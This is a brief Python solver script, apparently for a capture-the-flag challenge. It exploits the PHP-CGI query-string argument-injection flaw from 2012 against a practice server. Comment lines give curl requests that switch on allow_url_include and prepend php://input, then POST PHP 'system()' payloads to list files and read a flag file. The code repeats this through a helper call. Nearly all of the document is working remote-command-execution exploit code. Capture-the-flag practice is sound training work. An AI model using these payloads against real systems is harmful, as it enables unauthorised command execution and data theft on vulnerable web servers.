# 1. search for information about 2012:1823
# 2. see "http://ctfq.sweetduet.info:10080/~q12/index.php?-s"
# 3. curl
# $curl "http://ctfq.sweetduet.info:10080/~q12/index.php?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input" \
#   -X POST -d "<?php system('ls -la'); ?>"
# $curl "http://ctfq.sweetduet.info:10080/~q12/index.php?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input" \
# -X POST -d "<?php system('cat flag_flag_flag.txt'); ?>"
from web import OSCi

OSCi.php("http://ctfq.sweetduet.info:10080/~q12/index.php", "ls -la")
OSCi.php("http://ctfq.sweetduet.info:10080/~q12/index.php", "cat flag_flag_flag.txt")
